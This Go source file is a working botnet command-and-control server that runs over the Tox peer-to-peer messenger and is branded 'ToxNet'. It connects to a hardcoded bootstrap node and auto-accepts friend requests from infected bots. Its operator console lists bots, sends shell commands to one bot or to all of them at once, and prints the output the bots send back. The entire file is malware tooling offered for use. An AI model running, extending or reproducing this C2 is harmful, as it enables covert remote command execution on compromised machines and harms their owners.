package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"

	"time"

	tox "github.com/TokTok/go-toxcore-c"
)

func init() {
	log.SetFlags(log.Flags() | log.Lshortfile)
}

var server = []interface{}{
	"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
}

var fname = "./server.data"
var nickPrefix = "a"
var statusinput = ""

var fv []uint32 // Bots list

var commandHistory []string

// Color section
var colorReset = "\033[0m"
var colorRed = "\033[31m"
var colorGreen = "\033[32m"
var colorYellow = "\033[33m"
var colorBlue = "\033[34m"
var colorPurple = "\033[35m"
var colorCyan = "\033[36m"
var colorWhite = "\033[37m"
var colorBlack = "\033[30m"
var colorGrey = "\033[31m"

// ListBots
func Bots(t *tox.Tox, option string) []uint32 {

	fv := t.SelfGetFriendList()

	if option == "pull" {
		return fv
	} else {

		for _, fno := range fv {
			// Pull system information
			bio, err := t.FriendGetStatusMessage(fno)
			if err != nil {
				panic(err)
			}
			// Get online status
			status, err := t.FriendGetConnectionStatus(fno)
			if err != nil {
				panic(err)
			}

			if option == "all" {
				if status == 0 {
					fmt.Println("Offline:", fno, bio)
				} else {
					fmt.Println("Online:", fno, bio)
				}
			}

			if option == "online" {
				if status != 0 {
					fmt.Println("Online:", fno, bio)
				}
			}

			if option == "offline" {
				if status == 0 {
					fmt.Println("Offline:", fno, bio)
				}
			}

		}
		return nil
	}
}

// SendMessage - message
func SendMessage(t *tox.Tox, friendNumber uint32, message string) error {
	_, err := t.FriendSendMessage(friendNumber, message)
	if err != nil {
		return err
	}
	return nil
}

// showC2 - Display a banner of the C2 Tox ID
func showC2(toxid string, toxpub string) {

	fmt.Println(string(colorYellow), `
	 _____                 __       _   
	/__   \ ___ __  __  /\ \ \ ___ | |_ 
	  / /\// _ \\ \/ / /  \/ // _ \| __|
	 / /  | (_) |>  < / /\  /|  __/| |_ 
	 \/    \___//_/\_\\_\ \/  \___| \__|
	`, string(colorReset))

	fmt.Println("")
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorRed), "C2:", toxid, string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorRed), "Pub:", toxpub, string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("")
}

// helpCommands - Print commands with examples
func helpCommands(help string) {
	fmt.Println(string(colorPurple), "\n\tExamples:", help, string(colorReset))
	if help == "" {
		fmt.Println(string(colorYellow))
		fmt.Println("\t\tbots - Displays examples of controlling bots")
		fmt.Println("\t\tcommands - Display previous commands")
		fmt.Println("\t\tclear - Clear the console")
		fmt.Println(string(colorReset))
	} else if help == "bots" {
		fmt.Println(string(colorYellow))
		fmt.Println("\t\tbots list all - List all bots")
		fmt.Println("\t\tbots list amount - List total amount of bots")
		fmt.Println("\t\tbots list online - List online bots")
		fmt.Println("\t\tbots interact <id> ! ls -lah - Execute shell command")
		fmt.Println("\t\tbots interact * ! ls -lah - Mass execute")
		fmt.Println(string(colorReset))
	}
}

func main() {

	opt := tox.NewToxOptions()
	if tox.FileExist(fname) {
		data, err := ioutil.ReadFile(fname)
		if err != nil {
			log.Println(err)
		} else {
			opt.Savedata_data = data
			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
		}
	}

	opt.Tcp_port = 33445
	var t *tox.Tox
	for i := 0; i < 5; i++ {
		t = tox.NewTox(opt)
		if t == nil {
			opt.Tcp_port++
		} else {
			break
		}
	}

	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
	if err != nil {
		log.Println("bootstrap:", r, err, r2)
	}

	toxid := t.SelfGetAddress()
	toxpub := t.SelfGetPublicKey()

	defaultName := t.SelfGetName()
	humanName := nickPrefix + toxid[0:5]
	if humanName != defaultName {
		t.SelfSetName(humanName)
	}
	humanName = t.SelfGetName()

	defaultStatusinput, err := t.SelfGetStatusMessage()
	if defaultStatusinput != statusinput {
		t.SelfSetStatusMessage(statusinput)
	}

	err = t.WriteSavedata(fname)
	if err != nil {
		log.Println(err)
	}

	// Show C2 address
	showC2(toxid, toxpub)

	// Server load, pull all bots
	fv = Bots(t, "pull")
	fmt.Println(string(colorPurple))
	fmt.Println("\tTotal bots:", len(fv))
	fmt.Println(string(colorReset))

	// Console for commands
	go func() {

		reader := bufio.NewReader(os.Stdin)

		for {

			fmt.Print(string(colorGreen), "\n-> ", string(colorReset), string(colorGrey))
			input, _ := reader.ReadString('\n')
			input = strings.Replace(input, "\n", "", -1)

			// Append every input to the commands array
			commandHistory = append(commandHistory, input)

			// If input equals commands, print each command
			if input == "commands" {
				fmt.Println(string(colorPurple), "\n\n\tHistory:", string(colorReset))
				for _, command := range commandHistory {
					fmt.Println(string(colorYellow), "\t\t", command, string(colorReset))
				}
			}

			fmt.Println(string(colorReset))

			// If the command starts with bots
			if strings.HasPrefix(input, "bots") {
				// Split command
				args := strings.Fields(input)
				// If there is more or 4 arguments in the command.
				if len(args) >= 3 {
					// If the 2nd argument in the command is list.
					if args[1] == "list" {
						if args[2] == "amount" {
							// Server load, pull all bots
							fv = Bots(t, "pull")
							fmt.Println(string(colorPurple))
							fmt.Println("\tTotal bots:", len(fv))
							fmt.Println(string(colorReset))
						}

						// List online
						if args[2] == "online" {
							Bots(t, "online")
						}
						// List offline
						if args[2] == "offline" {
							Bots(t, "offline")
						}

						// If the 2nd argument in the command is interact.
					} else if args[1] == "interact" {
						// Grab all bots, when getting ready to interact.
						fv = Bots(t, "pull")

						// Convert ID to int
						botid, err := strconv.Atoi(args[2])
						if err != nil {
							log.Println(err)
						}

						// If the bot ID is in the the bots list.
						if botid < len(fv) {
							// Send the command to the bot.
							commands := args[3:]
							command := strings.Join(commands, " ")
							err = SendMessage(t, fv[botid], command)

							if err != nil {
								fmt.Println("Bot offline...")
							}

						} else {
							fmt.Println("Bot doesn't exist...")
						}
					}

				} else {
					// Not enough arguments: show examples
					helpCommands("bots")
				}

			} else if input == "help" {
				// Show help menu
				helpCommands("")
			} else if input == "clear" {
				// Clear console
				fmt.Print("\033[H\033[2J")
				showC2(toxid, toxpub)
			} else if input == "exit" {
				// Exit
				fmt.Println("\tGoodbye!")
				os.Exit(1)
			}
		}
	}()

	// Auto accept
	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {

		// When a bot adds the C2. Add them back with no message.
		num, err := t.FriendAddNorequest(friendId)

		if err != nil {
			log.Println("on friend request:", num, err)
		}
		if num < 100000 {
			t.WriteSavedata(fname)
		}
	}, nil)

	// On message
	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
		fmt.Print(string(colorYellow), "Output:", friendNumber, string(colorCyan), "\n\t\t", message)
		fmt.Print(string(colorGreen), "-> ", string(colorRed))
	}, nil)

	// toxcore loops
	shutdown := false
	loopc := 0
	itval := 0
	for !shutdown {
		iv := t.IterationInterval()
		if iv != itval {
			itval = iv
		}

		t.Iterate()
		loopc++
		time.Sleep(1000 * 50 * time.Microsecond)
	}

	t.Kill()

}

func makekey(no uint32, a0 interface{}, a1 interface{}) string {
	return fmt.Sprintf("%d_%v_%v", no, a0, a1)
}

func init() {
	tox.KeepPkg()
}
